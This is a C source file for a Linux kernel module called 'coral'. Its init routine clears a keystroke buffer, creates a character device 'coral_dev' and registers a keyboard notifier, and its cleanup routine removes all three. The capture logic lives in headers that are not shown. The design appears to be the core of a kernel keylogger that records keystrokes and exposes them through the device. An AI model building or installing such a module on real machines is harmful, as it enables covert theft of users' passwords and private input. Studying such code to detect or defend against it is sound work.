#include <linux/module.h>        /* required by all kernel modules, module_init(), module_exit() */
#include <linux/init.h>          /* __init, __exit, module_init, module_exit macros */
#include <linux/printk.h>        /* pr_info() */
#include <linux/device.h>        /* device_create(), device_destroy() */
#include <linux/device/class.h>  /* class_create(), class_destroy() */
#include <linux/kdev_t.h>        /* MKDEV macro */
#include <linux/string.h>        /* memset() */
#include <linux/keyboard.h>      /* register_keyboard_notifier(), unregister_keyboard_notifier() */
#include <linux/version.h>

#include "coral_device.h"        /* fops */
#include "coral_notifier.h"      /* keybuf */


#define DEVICE_NAME   "coral_dev"


/* major number of our device, to be dynamically assigned during module initialization */
static int device_major;

static struct class *device_class;


/*
 * coral_init()
 *
 * Run at module insertion. Registers character device driver, creates a character
 * device, and registers the keyboard notifier.
 *
 */

static int __init coral_init(void)        /* called when module is 'insmod'ed into the kernel */
{
  
  /* zero out keybuf */
  memset(keybuf, 0, BUFFER_LENGTH);
  
  /* register character device with dynamically allocated major number */
  device_major = register_chrdev(0, DEVICE_NAME, &fops);

  if(device_major < 0) {
    pr_alert("[CORAL] ERROR: Error while registering device!\n");
    return -1;
  }
  
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0) 
  device_class = class_create(DEVICE_NAME); 
#else 
  device_class = class_create(THIS_MODULE, DEVICE_NAME); 
#endif

  /* creates our device giving it major number device_major which was dynamically obtained
     earlier, and minor number 0 */
  device_create(device_class, NULL, MKDEV(device_major, 0), NULL, DEVICE_NAME);


  register_keyboard_notifier(&notif_block);

  return 0;
}

/*
 * coral_cleanup()
 *
 * Run before module is removed. Destroys the character device, unregisters the
 * character device driver, and unregisters the keyboard notifier.
 * 
 */

static void __exit coral_cleanup(void)   /* called just before module is removed from kernel */
{
  device_destroy(device_class, MKDEV(device_major, 0));
  class_destroy(device_class);

  unregister_chrdev(device_major, DEVICE_NAME);

  unregister_keyboard_notifier(&notif_block);
}


/* these need to be set because non-standard function names are used */
module_init(coral_init);
module_exit(coral_cleanup);


MODULE_LICENSE("GPL");
